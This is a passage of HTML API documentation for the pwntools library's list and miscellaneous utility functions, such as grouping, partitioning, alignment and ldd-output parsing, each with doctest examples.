<code class="descclassname">pwnlib.util.lists.</code><code class="descname">concat</code><span class="sig-paren">(</span><em>l</em><span class="sig-paren">)</span> &#x2192; list<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/lists.py#L89-105"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.lists.concat" title="Permalink to this definition">¶</a></dt>
<dd><p>Concats a list of lists into a list.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">concat</span><span class="p">([[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">],</span> <span class="p">[</span><span class="mi">3</span><span class="p">]])</span>
<span class="go">[1, 2, 3]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.lists.concat_all">
<code class="descclassname">pwnlib.util.lists.</code><code class="descname">concat_all</code><span class="sig-paren">(</span><em>*args</em><span class="sig-paren">)</span> &#x2192; list<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/lists.py#L107-125"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.lists.concat_all" title="Permalink to this definition">¶</a></dt>
<dd><p>Concats all the arguments together.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">concat_all</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">)],</span> <span class="p">[([[</span><span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">]])])</span>
<span class="go">[0, 1, 2, 3, 4, 5, 6]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.lists.findall">
<code class="descclassname">pwnlib.util.lists.</code><code class="descname">findall</code><span class="sig-paren">(</span><em>l</em>, <em>e</em><span class="sig-paren">)</span> &#x2192; l<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/lists.py#L149-208"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.lists.findall" title="Permalink to this definition">¶</a></dt>
<dd><p>Generate all indices of needle in haystack, using the
Knuth-Morris-Pratt algorithm.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">foo</span> <span class="o">=</span> <span class="n">findall</span><span class="p">([</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">],</span> <span class="mi">4</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">foo</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
<span class="go">3</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">foo</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
<span class="go">4</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">foo</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
<span class="go">6</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.lists.group">
<code class="descclassname">pwnlib.util.lists.</code><code class="descname">group</code><span class="sig-paren">(</span><em>n</em>, <em>lst</em>, <em>underfull_action = 'ignore'</em>, <em>fill_value = None</em><span class="sig-paren">)</span> &#x2192; list<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/lists.py#L34-87"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.lists.group" title="Permalink to this definition">¶</a></dt>
<dd><p>Split sequence into subsequences of given size. If the values cannot be
evenly distributed among into groups, then the last group will either be
returned as is, thrown out or padded with the value specified in fill_value.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>n</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; The size of resulting groups</li>
<li><strong>lst</strong> &#8211; The list, tuple or string to group</li>
<li><strong>underfull_action</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The action to take in case of an underfull group at the end. Possible values are &#8216;ignore&#8217;, &#8216;drop&#8217; or &#8216;fill&#8217;.</li>
<li><strong>fill_value</strong> &#8211; The value to fill into an underfull remaining group.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A list containing the grouped values.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">group</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s2">&quot;ABCDEFG&quot;</span><span class="p">)</span>
<span class="go">[&#39;ABC&#39;, &#39;DEF&#39;, &#39;G&#39;]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">group</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s1">&#39;ABCDEFG&#39;</span><span class="p">,</span> <span class="s1">&#39;drop&#39;</span><span class="p">)</span>
<span class="go">[&#39;ABC&#39;, &#39;DEF&#39;]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">group</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s1">&#39;ABCDEFG&#39;</span><span class="p">,</span> <span class="s1">&#39;fill&#39;</span><span class="p">,</span> <span class="s1">&#39;Z&#39;</span><span class="p">)</span>
<span class="go">[&#39;ABC&#39;, &#39;DEF&#39;, &#39;GZZ&#39;]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">group</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="nb">list</span><span class="p">(</span><span class="s1">&#39;ABCDEFG&#39;</span><span class="p">),</span> <span class="s1">&#39;fill&#39;</span><span class="p">)</span>
<span class="go">[[&#39;A&#39;, &#39;B&#39;, &#39;C&#39;], [&#39;D&#39;, &#39;E&#39;, &#39;F&#39;], [&#39;G&#39;, None, None]]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.lists.ordlist">
<code class="descclassname">pwnlib.util.lists.</code><code class="descname">ordlist</code><span class="sig-paren">(</span><em>s</em><span class="sig-paren">)</span> &#x2192; list<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/lists.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.lists.ordlist" title="Permalink to this definition">¶</a></dt>
<dd><p>Turns a string into a list of the corresponding ascii values.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">ordlist</span><span class="p">(</span><span class="s2">&quot;hello&quot;</span><span class="p">)</span>
<span class="go">[104, 101, 108, 108, 111]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.lists.partition">
<code class="descclassname">pwnlib.util.lists.</code><code class="descname">partition</code><span class="sig-paren">(</span><em>lst</em>, <em>f</em>, <em>save_keys = False</em><span class="sig-paren">)</span> &#x2192; list<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/lists.py#L4-32"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.lists.partition" title="Permalink to this definition">¶</a></dt>
<dd><p>Partitions an iterable into sublists using a function to specify which
group they belong to.</p>
<p>It works by calling <cite>f</cite> on every element and saving the results into
an <a class="reference external" href="https://docs.python.org/2.7/library/collections.html#collections.OrderedDict" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">collections.OrderedDict</span></code></a>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>lst</strong> &#8211; The iterable to partition</li>
<li><strong>f</strong> (<a class="reference internal" href="index.html#pwnlib.shellcraft.i386.function" title="pwnlib.shellcraft.i386.function"><em>function</em></a>) &#8211; The function to use as the partitioner.</li>
<li><strong>save_keys</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Set this to True, if you want the OrderedDict
returned instead of just the values</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">partition</span><span class="p">([</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">],</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="o">&amp;</span><span class="mi">1</span><span class="p">)</span>
<span class="go">[[1, 3, 5], [2, 4]]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.lists.unordlist">
<code class="descclassname">pwnlib.util.lists.</code><code class="descname">unordlist</code><span class="sig-paren">(</span><em>cs</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/lists.py#L138-147"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.lists.unordlist" title="Permalink to this definition">¶</a></dt>
<dd><p>Takes a list of ascii values and returns the corresponding string.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">unordlist</span><span class="p">([</span><span class="mi">104</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">111</span><span class="p">])</span>
<span class="go">&#39;hello&#39;</span>
</pre></div>
</div>
</dd></dl>

</div>
<span id="document-util/misc"></span><div class="section" id="module-pwnlib.util.misc">
<span id="pwnlib-util-misc-we-could-not-fit-it-any-other-place"></span><h3><a class="reference internal" href="#module-pwnlib.util.misc" title="pwnlib.util.misc"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.util.misc</span></code></a> &#8212; We could not fit it any other place<a class="headerlink" href="#module-pwnlib.util.misc" title="Permalink to this headline">¶</a></h3>
<dl class="function">
<dt id="pwnlib.util.misc.align">
<code class="descclassname">pwnlib.util.misc.</code><code class="descname">align</code><span class="sig-paren">(</span><em>alignment</em>, <em>x</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/misc.py#L17-26"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.misc.align" title="Permalink to this definition">¶</a></dt>
<dd><p>Rounds <cite>x</cite> up to nearest multiple of the <cite>alignment</cite>.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="p">[</span><span class="n">align</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span> <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">15</span><span class="p">)]</span>
<span class="go">[0, 5, 5, 5, 5, 5, 10, 10, 10, 10, 10, 15, 15, 15, 15]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.misc.align_down">
<code class="descclassname">pwnlib.util.misc.</code><code class="descname">align_down</code><span class="sig-paren">(</span><em>alignment</em>, <em>x</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/misc.py#L29-39"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.misc.align_down" title="Permalink to this definition">¶</a></dt>
<dd><p>Rounds <cite>x</cite> down to nearest multiple of the <cite>alignment</cite>.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="p">[</span><span class="n">align_down</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span> <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">15</span><span class="p">)]</span>
<span class="go">[0, 0, 0, 0, 0, 5, 5, 5, 5, 5, 10, 10, 10, 10, 10]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.misc.binary_ip">
<code class="descclassname">pwnlib.util.misc.</code><code class="descname">binary_ip</code><span class="sig-paren">(</span><em>host</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/misc.py#L42-51"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.misc.binary_ip" title="Permalink to this definition">¶</a></dt>
<dd><p>Resolve host and return IP as four byte string.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">binary_ip</span><span class="p">(</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">)</span>
<span class="go">&#39;\x7f\x00\x00\x01&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.misc.dealarm_shell">
<code class="descclassname">pwnlib.util.misc.</code><code class="descname">dealarm_shell</code><span class="sig-paren">(</span><em>tube</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/misc.py#L300-315"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.misc.dealarm_shell" title="Permalink to this definition">¶</a></dt>
<dd><p>Given a tube which is a shell, dealarm it.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.misc.mkdir_p">
<code class="descclassname">pwnlib.util.misc.</code><code class="descname">mkdir_p</code><span class="sig-paren">(</span><em>path</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/misc.py#L289-298"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.misc.mkdir_p" title="Permalink to this definition">¶</a></dt>
<dd><p>Emulates the behavior of <code class="docutils literal"><span class="pre">mkdir</span> <span class="pre">-p</span></code>.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.misc.parse_ldd_output">
<code class="descclassname">pwnlib.util.misc.</code><code class="descname">parse_ldd_output</code><span class="sig-paren">(</span><em>output</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/misc.py#L258-287"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.misc.parse_ldd_output" title="Permalink to this definition">¶</a></dt>
<dd><p>Parses the output from a run of &#8216;ldd&#8217; on a binary.
Returns a dictionary of {path: address} for
each library required by the specified binary.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>output</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The output to parse</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">sorted</span><span class="p">(</span><span class="n">parse_ldd_output</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;</span>
<span class="gp">... </span><span class="s1">    linux-vdso.so.1 =&gt;  (0x00007fffbf5fe000)</span>
<span class="gp">... </span><span class="s1">    libtinfo.so.5 =&gt; /lib/x86_64-linux-gnu/libtinfo.so.5 (0x00007fe28117f000)</span>
<span class="gp">... </span><span class="s1">    libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe280f7b000)</span>
<span class="gp">... </span><span class="s1">    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe280bb4000)</span>
<span class="gp">... </span><span class="s1">    /lib64/ld-linux-x86-64.so.2 (0x00007fe2813dd000)</span>
<span class="gp">... </span><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">keys</span><span class="p">())</span>
<span class="go">[&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;, &#39;/lib/x86_64-linux-gnu/libdl.so.2&#39;, &#39;/lib/x86_64-linux-gnu/libtinfo.so.5&#39;, &#39;/lib64/ld-linux-x86-64.so.2&#39;]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.misc.read">
<code class="descclassname">pwnlib.util.misc.</code><code class="descname">read</code><span class="sig-paren">(</span><em>path</em>, <em>count=-1</em>, <em>skip=0</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/misc.py#L104-117"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.misc.read" title="Permalink to this definition">¶</a></dt>
<dd><p>Open file, return content.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">read</span><span class="p">(</span><span class="s1">&#39;/proc/self/exe&#39;</span><span class="p">)[:</span><span class="mi">4</span><span class="p">]</span>
<span class="go">&#39;\x7fELF&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.misc.register_sizes">
<code class="descclassname">pwnlib.util.misc.</code><code class="descname">register_sizes</code><span class="sig-paren">(</span><em>regs</em>, <em>in_sizes</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/misc.py#L317-361"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.misc.register_sizes" title="Permalink to this definition">¶</a></dt>
<dd><p>Create dictionaries over register sizes and relations</p>
<p>Given a list of lists of overlapping register names (e.g. [&#8216;eax&#8217;,&#8217;ax&#8217;,&#8217;al&#8217;,&#8217;ah&#8217;]) and a list of input sizes,
it returns the following:</p>
<ul class="simple">
<li>all_regs    : list of all valid registers</li>
<li>sizes[reg]  : the size of reg in bits</li>
<li>bigger[reg] : list of overlapping registers bigger than reg</li>
<li>smaller[reg]: list of overlapping registers smaller than reg</li>
</ul>
<p>Used in i386/AMD64 shellcode, e.g. the mov-shellcode.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">regs</span> <span class="o">=</span> <span class="p">[[</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span> <span class="s1">&#39;ax&#39;</span><span class="p">,</span> <span class="s1">&#39;al&#39;</span><span class="p">,</span> <span class="s1">&#39;ah&#39;</span><span class="p">],[</span><span class="s1">&#39;ebx&#39;</span><span class="p">,</span> <span class="s1">&#39;bx&#39;</span><span class="p">,</span> <span class="s1">&#39;bl&#39;</span><span class="p">,</span> <span class="s1">&#39;bh&#39;</span><span class="p">],</span>
<span class="gp">... </span><span class="p">[</span><span class="s1">&#39;ecx&#39;</span><span class="p">,</span> <span class="s1">&#39;cx&#39;</span><span class="p">,</span> <span class="s1">&#39;cl&#39;</span><span class="p">,</span> <span class="s1">&#39;ch&#39;</span><span class="p">],</span>
<span class="gp">... </span><span class="p">[</span><span class="s1">&#39;edx&#39;</span><span class="p">,</span> <span class="s1">&#39;dx&#39;</span><span class="p">,</span> <span class="s1">&#39;dl&#39;</span><span class="p">,</span> <span class="s1">&#39;dh&#39;</span><span class="p">],</span>
<span class="gp">... </span><span class="p">[</span><span class="s1">&#39;edi&#39;</span><span class="p">,</span> <span class="s1">&#39;di&#39;</span><span class="p">],</span>
<span class="gp">... </span><span class="p">[</span><span class="s1">&#39;esi&#39;</span><span class="p">,</span> <span class="s1">&#39;si&#39;</span><span class="p">],</span>
<span class="gp">... </span><span class="p">[</span><span class="s1">&#39;ebp&#39;</span><span class="p">,</span> <span class="s1">&#39;bp&#39;</span><span class="p">],</span>
<span class="gp">... </span><span class="p">[</span><span class="s1">&#39;esp&#39;</span><span class="p">,</span> <span class="s1">&#39;sp&#39;</span><span class="p">],</span>
<span class="gp">... </span><span class="p">]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">all_regs</span><span class="p">,</span> <span class="n">sizes</span><span class="p">,</span> <span class="n">bigger</span><span class="p">,</span> <span class="n">smaller</span> <span class="o">=</span> <span class="n">register_sizes</span><span class="p">(</span><span class="n">regs</span><span class="p">,</span> <span class="p">[</span><span class="mi">32</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">])</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">all_regs</span>
<span class="go">[&#39;eax&#39;, &#39;ax&#39;, &#39;al&#39;, &#39;ah&#39;, &#39;ebx&#39;, &#39;bx&#39;, &#39;bl&#39;, &#39;bh&#39;, &#39;ecx&#39;, &#39;cx&#39;, &#39;cl&#39;, &#39;ch&#39;, &#39;edx&#39;, &#39;dx&#39;, &#39;dl&#39;, &#39;dh&#39;, &#39;edi&#39;, &#39;di&#39;, &#39;esi&#39;, &#39;si&#39;, &#39;ebp&#39;, &#39;bp&#39;, &#39;esp&#39;, &#39;sp&#39;]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sizes</span>
<span class="go">{&#39;ch&#39;: 8, &#39;cl&#39;: 8, &#39;ah&#39;: 8, &#39;edi&#39;: 32, &#39;al&#39;: 8, &#39;cx&#39;: 16, &#39;ebp&#39;: 32, &#39;ax&#39;: 16, &#39;edx&#39;: 32, &#39;ebx&#39;: 32, &#39;esp&#39;: 32, &#39;esi&#39;: 32, &#39;dl&#39;: 8, &#39;dh&#39;: 8, &#39;di&#39;: 16, &#39;bl&#39;: 8, &#39;bh&#39;: 8, &#39;eax&#39;: 32, &#39;bp&#39;: 16, &#39;dx&#39;: 16, &#39;bx&#39;: 16, &#39;ecx&#39;: 32, &#39;sp&#39;: 16, &#39;si&#39;: 16}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">bigger</span>
<span class="go">{&#39;ch&#39;: [&#39;ecx&#39;, &#39;cx&#39;, &#39;ch&#39;], &#39;cl&#39;: [&#39;ecx&#39;, &#39;cx&#39;, &#39;cl&#39;], &#39;ah&#39;: [&#39;eax&#39;, &#39;ax&#39;, &#39;ah&#39;], &#39;edi&#39;: [&#39;edi&#39;], &#39;al&#39;: [&#39;eax&#39;, &#39;ax&#39;, &#39;al&#39;], &#39;cx&#39;: [&#39;ecx&#39;, &#39;cx&#39;], &#39;ebp&#39;: [&#39;ebp&#39;], &#39;ax&#39;: [&#39;eax&#39;, &#39;ax&#39;], &#39;edx&#39;: [&#39;edx&#39;], &#39;ebx&#39;: [&#39;ebx&#39;], &#39;esp&#39;: [&#39;esp&#39;], &#39;esi&#39;: [&#39;esi&#39;], &#39;dl&#39;: [&#39;edx&#39;, &#39;dx&#39;, &#39;dl&#39;], &#39;dh&#39;: [&#39;edx&#39;, &#39;dx&#39;, &#39;dh&#39;], &#39;di&#39;: [&#39;edi&#39;, &#39;di&#39;], &#39;bl&#39;: [&#39;ebx&#39;, &#39;bx&#39;, &#39;bl&#39;], &#39;bh&#39;: [&#39;ebx&#39;, &#39;bx&#39;, &#39;bh&#39;], &#39;eax&#39;: [&#39;eax&#39;], &#39;bp&#39;: [&#39;ebp&#39;, &#39;bp&#39;], &#39;dx&#39;: [&#39;edx&#39;, &#39;dx&#39;], &#39;bx&#39;: [&#39;ebx&#39;, &#39;bx&#39;], &#39;ecx&#39;: [&#39;ecx&#39;], &#39;sp&#39;: [&#39;esp&#39;, &#39;sp&#39;], &#39;si&#39;: [&#39;esi&#39;, &#39;si&#39;]}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">smaller</span>
<span class="go">{&#39;ch&#39;: [], &#39;cl&#39;: [], &#39;ah&#39;: [], &#39;edi&#39;: [&#39;di&#39;], &#39;al&#39;: [], &#39;cx&#39;: [&#39;cl&#39;, &#39;ch&#39;], &#39;ebp&#39;: [&#39;bp&#39;], &#39;ax&#39;: [&#39;al&#39;, &#39;ah&#39;], &#39;edx&#39;: [&#39;dx&#39;, &#39;dl&#39;, &#39;dh&#39;], &#39;ebx&#39;: [&#39;bx&#39;, &#39;bl&#39;, &#39;bh&#39;], &#39;esp&#39;: [&#39;sp&#39;], &#39;esi&#39;: [&#39;si&#39;], &#39;dl&#39;: [], &#39;dh&#39;: [], &#39;di&#39;: [], &#39;bl&#39;: [], &#39;bh&#39;: [], &#39;eax&#39;: [&#39;ax&#39;, &#39;al&#39;, &#39;ah&#39;], &#39;bp&#39;: [], &#39;dx&#39;: [&#39;dl&#39;, &#39;dh&#39;], &#39;bx&#39;: [&#39;bl&#39;, &#39;bh&#39;], &#39;ecx&#39;: [&#39;cx&#39;, &#39;cl&#39;, &#39;ch&#39;], &#39;sp&#39;: [], &#39;si&#39;: []}</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.misc.run_in_new_terminal">
<code class="descclassname">pwnlib.util.misc.</code><code class="descname">run_in_new_terminal</code><span class="sig-paren">(</span><em>command</em>, <em>terminal = None</em><span class="sig-paren">)</span> &#x2192; None<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/misc.py#L179-256"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.misc.run_in_new_terminal" title="Permalink to this definition">¶</a></dt>
<dd><p>Run a command in a new terminal.</p>
<dl class="docutils">
<dt>When <code class="docutils literal"><span class="pre">terminal</span></code> is not set:</dt>
<dd><ul class="first last simple">
<li>If <code class="docutils literal"><span class="pre">context.terminal</span></code> is set it will be used.
If it is an iterable then <code class="docutils literal"><span class="pre">context.terminal[1:]</span></code> are default arguments.</li>
<li>If a <code class="docutils literal"><span class="pre">pwntools-terminal</span></code> command exists in <code class="docutils literal"><span class="pre">$PATH</span></code>, it is used</li>
<li>If <code class="docutils literal"><span class="pre">$TERM_PROGRAM</span></code> is set, that is used.</li>
<li>If X11 is detected (by the presence of the <code class="docutils literal"><span class="pre">$DISPLAY</span></code> environment
variable), <code class="docutils literal"><span class="pre">x-terminal-emulator</span></code> is used.</li>
<li>If tmux is detected (by the presence of the <code class="docutils literal"><span class="pre">$TMUX</span></code> environment
variable), a new pane will be opened.</li>
</ul>
</dd>
</dl>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>command</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The command to run.</li>
<li><strong>terminal</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Which terminal to use.</li>
<li><strong>args</strong> (<a class="reference internal" href="index.html#pwnlib.protocols.adb.AdbClient.list" title="pwnlib.protocols.adb.AdbClient.list"><em>list</em></a>) &#8211; Arguments to pass to the terminal</li>
</ul>
</td>
</tr>
</tbody>
</table>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">The command is opened with <code class="docutils literal"><span class="pre">/dev/null</span></code> for stdin, stdout, stderr.</p>
</div>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">PID of the new terminal process</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.misc.size">
<code class="descclassname">pwnlib.util.misc.</code><code class="descname">size</code><span class="sig-paren">(</span><em>n</em>, <em>abbrev = 'B'</em>, <em>si = False</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/misc.py#L54-94"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.misc.size" title="Permalink to this definition">¶</a></dt>
<dd><p>Convert the length of a bytestream to human readable form.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>n</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a><em>,</em><em>iterable</em>) &#8211; The length to convert to human readable form,
or an object which can have <code class="docutils literal"><span class="pre">len()</span></code> called on it.</li>
<li><strong>abbrev</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; String appended to the size, defaults to <code class="docutils literal"><span class="pre">'B'</span></code>.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
